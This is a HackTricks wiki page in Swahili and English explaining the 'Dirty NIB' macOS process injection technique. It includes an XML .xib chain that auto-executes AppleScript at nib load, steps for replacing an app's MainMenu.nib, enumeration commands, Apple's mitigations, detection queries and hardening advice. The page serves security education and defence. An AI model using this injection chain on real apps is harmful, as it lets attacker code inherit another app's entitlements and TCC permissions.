# Dirty NIB ya macOS

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB inahusu kutumia vibaya faili za Interface Builder (.xib/.nib) ndani ya macOS app bundle iliyosainiwa ili kutekeleza logic inayodhibitiwa na mshambuliaji ndani ya target process, hivyo kurithi entitlements na ruhusa zake za TCC. Technique hii iliandikwa awali na xpn (MDSec), na baadaye ikafanywa kuwa ya jumla zaidi na kupanuliwa kwa kiasi kikubwa na Sector7, ambaye pia alieleza mitigations za Apple katika macOS 13 Ventura na macOS 14 Sonoma.<sup>[[1]](#references)[[2]](#references)</sup> Kwa maelezo ya msingi na uchambuzi wa kina, angalia references zilizo mwishoni.

> TL;DR
> • Kabla ya macOS 13 Ventura: kubadilisha MainMenu.nib ya bundle (au nib nyingine inayopakiwa wakati wa startup) kwa kawaida kuliwezesha process injection na mara nyingi privilege escalation.
> • Tangu macOS 13 (Ventura), na ikiwa imeboreshwa katika macOS 14 (Sonoma): first-launch deep verification, bundle protection, Launch Constraints, na ruhusa mpya ya TCC ya “App Management” kwa kiasi kikubwa huzuia nib tampering baada ya launch na apps zisizohusiana. Attacks bado zinaweza kuwezekana katika hali maalum (kwa mfano, same-developer tooling inayorekebisha apps zake yenyewe, au terminals zilizopewa App Management/Full Disk Access na user).


## Faili za NIB/XIB ni nini

Faili za Nib (jina fupi la NeXT Interface Builder) ni serialized UI object graphs zinazotumiwa na AppKit apps. Xcode ya kisasa huhifadhi XML .xib zinazoweza kuhaririwa, ambazo hukompailiwa kuwa .nib wakati wa build. App ya kawaida hupakia UI yake kuu kupitia `NSApplicationMain()` ambayo husoma key ya `NSMainNibFile` kutoka kwenye Info.plist ya app na kuunda object graph hiyo wakati wa runtime.

Mambo muhimu yanayowezesha attack:
- NIB loading huunda arbitrary Objective-C classes bila kuhitaji zifuate NSSecureCoding (nib loader ya Apple hutumia `init`/`initWithFrame:` kama fallback wakati `initWithCoder:` haipatikani).
- Cocoa Bindings zinaweza kutumiwa vibaya kuita methods wakati nibs zinaundwa, ikiwemo chained calls ambazo hazihitaji user interaction.


## Mchakato wa Dirty NIB injection (mtazamo wa mshambuliaji)

Mtiririko wa kawaida kabla ya Ventura:
1) Tengeneza .xib yenye malicious content
- Ongeza object ya `NSAppleScript` (au “gadget” classes nyingine kama `NSTask`).
- Ongeza `NSTextField` ambayo title yake ina payload (kwa mfano, AppleScript au command arguments).
- Ongeza `NSMenuItem` objects moja au zaidi zilizounganishwa kupitia bindings ili kuita methods kwenye target object.

2) Iji-trigger bila user clicks
- Tumia bindings kuweka target/selector ya menu item, kisha uite private `_corePerformAction` method ili action itekelezwe automatically wakati nib inapakiwa. Hii huondoa hitaji la user kubofya button.

Mfano mdogo wa auto-trigger chain ndani ya .xib (umefupishwa kwa uwazi zaidi):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Hii inafanikisha utekelezaji wa AppleScript wa kiholela katika target process wakati wa nib load.<sup>[[1]](#references)</sup> Advanced chains zinaweza:
- Kuanzisha AppKit classes za kiholela (kwa mfano, `NSTask`) na kuita methods zisizo na arguments kama `-launch`.
- Kuita selectors za kiholela zenye object arguments kupitia binding trick iliyo hapo juu.
- Kupakia AppleScriptObjC.framework ili kuunganisha na Objective-C na hata kuita C APIs zilizochaguliwa.
- Kwenye systems za zamani ambazo bado zinajumuisha Python.framework, kuunganisha na Python na kisha kutumia `ctypes` kuita C functions za kiholela (utafiti wa Sector7).<sup>[[2]](#references)</sup>

3) Replace app’s nib
- Nakili target.app hadi location inayoweza kuandikwa, replace kwa mfano `Contents/Resources/MainMenu.nib` kwa malicious nib, kisha endesha target.app. Kabla ya Ventura, baada ya Gatekeeper assessment ya mara moja, launches zilizofuata zilifanya shallow signature checks pekee, hivyo resources zisizoweza kutekelezwa (kama .nib) hazikufanyiwa re-validation.

Example AppleScript payload kwa visible test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Ulinzi wa kisasa wa macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple ilianzisha hatua kadhaa za systemic mitigations zinazopunguza kwa kiasi kikubwa uwezekano wa kutumia Dirty NIB kwenye macOS za kisasa:<sup>[[2]](#references)</sup>
- Uthibitishaji wa kina wakati wa first launch na ulinzi wa bundle (macOS 13 Ventura)
- Wakati wa kuendesha app yoyote kwa mara ya kwanza (iwe quarantined au la), signature check ya kina hukagua resources zote za bundle. Baada ya hapo, bundle huwa protected: ni apps kutoka kwa developer huyo huyo pekee (au zilizopewa ruhusa wazi na app) zinazoweza kurekebisha yaliyomo. Apps nyingine zinahitaji ruhusa mpya ya TCC ya “App Management” ili kuandika ndani ya bundle ya app nyingine.
- Launch Constraints (macOS 13 Ventura)
- System/Apple-bundled apps haziwezi kunakiliwa mahali pengine na kuendeshwa; hii huondoa mbinu ya “copy to /tmp, patch, run” kwa OS apps.
- Maboresho katika macOS 14 Sonoma
- Apple iliimarisha App Management na kurekebisha bypasses zilizojulikana (kwa mfano, CVE‑2023‑40450) zilizotajwa na Sector7. Python.framework iliondolewa mapema (macOS 12.3), na kuvunja baadhi ya privilege-escalation chains.
- Mabadiliko ya Gatekeeper/Quarantine
- Kwa mjadala mpana kuhusu Gatekeeper, provenance, na mabadiliko ya assessment yaliyoathiri technique hii, angalia ukurasa uliorejelewa hapa chini.

> Maana yake kiutendaji
> • Kwenye Ventura+ kwa ujumla huwezi kurekebisha .nib ya app ya third-party isipokuwa process yako iwe na App Management au isainiwe kwa Team ID ileile ya target (kwa mfano, developer tooling).
> • Kutoa App Management au Full Disk Access kwa shells/terminals hufungua tena attack surface hii kwa chochote kinachoweza kutekeleza code ndani ya context ya terminal hiyo.


### Kushughulikia Launch Constraints

Launch Constraints huzuia kuendesha Apple apps nyingi kutoka maeneo yasiyo ya default kuanzia Ventura. Ikiwa ulitegemea workflows za kabla ya Ventura kama kunakili Apple app kwenye temporary directory, kurekebisha `MainMenu.nib`, na kuizindua, tarajia hiyo ishindwe kwenye >= 13.0.


## Kuhesabu targets na nibs (muhimu kwa utafiti / legacy systems)

- Tafuta apps ambazo UI yake inaendeshwa na nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Tafuta nib resources zinazoweza kuwa candidates ndani ya bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Thibitisha signatures za code kwa kina (itashindikana ikiwa ulibadilisha resources na hukusaini tena):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Kumbuka: Kwenye macOS za kisasa pia utazuiwa na bundle protection/TCC unapojaribu kuandika ndani ya bundle ya app nyingine bila authorization inayofaa.


## Vidokezo vya Detection na DFIR

- File integrity monitoring kwenye bundle resources
- Fuatilia mabadiliko ya mtime/ctime kwenye `Contents/Resources/*.nib` na resources nyingine zisizoweza kutekelezwa ndani ya apps zilizosakinishwa.
- Unified logs na tabia ya process
- Fuatilia utekelezaji usiotarajiwa wa AppleScript ndani ya GUI apps na processes zinazopakia AppleScriptObjC au Python.framework. Mfano:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proactive assessments
- Mara kwa mara endesha `codesign --verify --deep` kwenye apps muhimu ili kuhakikisha resources zinabaki salama.
- Muktadha wa privilege
- Kagua ni nani/kitu gani kilicho na TCC “App Management” au Full Disk Access (hasa terminals na management agents). Kuondoa ruhusa hizi kwenye general-purpose shells huzuia kuwezeshwa tena kwa urahisi kwa tampering ya mtindo wa Dirty NIB.


## Defensive hardening (developers na defenders)

- Pendelea programmatic UI au punguza kile kinachoinstantiated kutoka kwenye nibs. Epuka kujumuisha classes zenye nguvu (kwa mfano, `NSTask`) kwenye nib graphs na epuka bindings zinazoita selectors kwa njia isiyo ya moja kwa moja kwenye objects zisizo za kiholela.
- Tumia hardened runtime pamoja na Library Validation (ambayo tayari ni kiwango cha kawaida kwa apps za kisasa). Ingawa hii haizuii nib injection yenyewe, huzuia native code loading rahisi na kuwalazimisha attackers kutumia scripting-only payloads.
- Usiombe au kutegemea permissions pana za App Management kwenye general-purpose tools. Ikiwa MDM inahitaji App Management, tenga muktadha huo na user-driven shells.
- Thibitisha mara kwa mara integrity ya app bundle yako na ufanye update mechanisms zako zijirekebishe zenyewe bundle resources.


## Related reading in HackTricks

Jifunze zaidi kuhusu Gatekeeper, quarantine na mabadiliko ya provenance yanayoathiri technique hii:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- [1] [xpn – DirtyNIB (original write‑up with Pages example)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
